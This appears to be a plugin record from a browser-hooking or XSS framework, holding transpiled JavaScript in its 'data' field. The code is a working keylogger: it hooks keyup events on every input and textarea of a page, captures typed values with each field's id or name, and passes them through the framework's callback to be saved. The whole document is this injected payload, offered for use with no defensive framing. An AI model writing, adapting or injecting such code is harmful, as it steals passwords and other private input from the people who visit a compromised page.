{'pluginId': '5ebe4821d084dd1b8708374f', 'pluginType': 0, 'data': '"use strict";\n\nfunction _typeof(obj) { "@babel/helpers - typeof"; if (typeof Symbol === "function" && typeof Symbol.iterator === "symbol") { _typeof = function _typeof(obj) { return typeof obj; }; } else { _typeof = function _typeof(obj) { return obj && typeof Symbol === "function" && obj.constructor === Symbol && obj !== Symbol.prototype ? "symbol" : typeof obj; }; } return _typeof(obj); }\n\nfunction _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }\n\nfunction _defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } }\n\nfunction _createClass(Constructor, protoProps, staticProps) { if (protoProps) _defineProperties(Constructor.prototype, protoProps); if (staticProps) _defineProperties(Constructor, staticProps); return Constructor; }\n\n(function () {\n  var Plugin = /*#__PURE__*/function () {\n    function Plugin(api, args, plugin) {\n      _classCallCheck(this, Plugin);\n\n      this.api = api;\n      this.plugin = plugin;\n      this.run();\n    }\n\n    _createClass(Plugin, [{\n      key: "run",\n      value: function run() {\n        var that = this;\n\n        var keyLogger = function keyLogger(elems) {\n          var debounced = that.api.base.debounce(function () {\n            var title, value;\n            value = $(this).val() ? $(this).val() : $(this).html();\n\n            if (!value) {\n              return;\n            }\n\n            title = [];\n\n            if ($(this).attr(\'id\')) {\n              title.push("id:" + $(this).attr(\'id\'));\n            }\n\n            if ($(this).attr(\'name\')) {\n              title.push("name:" + $(this).attr(\'name\'));\n            }\n\n            title = title.length ? title.join(\', \') : \'NULL\';\n            that.callback({\n              title: title,\n              value: value\n            });\n          }, 500);\n          $(elems).on(\'keyup\', debounced);\n        };\n\n        keyLogger($(\'input\'));\n        keyLogger($(\'textarea\'));\n      }\n    }, {\n      key: "callback",\n      value: function callback(data) {\n        this.api.callback({\n          status: true,\n          msg: \'\',\n          data: data\n        }, {\n          plugin: this.plugin,\n          save: true,\n          type: _typeof(data) === \'object\' ? \'json\' : \'string\'\n        });\n      }\n    }]);\n\n    return Plugin;\n  }();\n\n  return Plugin;\n})();', 'run': '{}'}